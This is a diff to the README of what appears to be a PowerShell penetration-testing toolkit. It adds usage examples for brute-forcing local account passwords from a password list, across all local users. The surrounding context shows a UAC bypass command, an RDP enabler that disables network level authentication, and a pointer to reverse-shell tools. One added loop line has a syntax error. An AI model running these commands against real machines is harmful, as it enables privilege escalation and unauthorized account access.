@@ -200,8 +200,21 @@ Invoke-DccwUACBypass -Program "cmd /c start mfs.exe"
 ```
 
 - Enable-RDP is used to enable RDP on a local machine, disable network level authentication, and enable the firewall rule for port 3389.
-- ```powershell
+```powershell
 Enable-RDP
+```
+
+- Test-BruteLocalUserCredential is used to brute force the password of a local account on a local machine
+```powershell
+Test-BruteLocalUserCredential -Username Administrator -Passwd 'Password123!','Passw0rd1!'
+# This example tests the two defined passwords against the Administrator user account
+
+Test-BruteLocalUserCredential -Username Administrator -Passwd (Get-Content -Path C:\Temp\passlist.txt)
+# This example tests the passwords inside the C:\Temp\passlist.txt file against the Administrator user account
+
+$Users = (Get-LocalUser).Name
+ForEach $U in $Users) {Test-BruteLocalUserCredential -Username $U -Passwd (Get-Content -Path C:\Temp\passlist.txt)}
+# This example tests a password list against all local user accounts
 ```
 
 For more information on Start-Listener, Start-Bind, and Invoke-ReversePowerShell see [https://github.com/tobor88/ReversePowerShell](https://github.com/tobor88/ReversePowerShell)
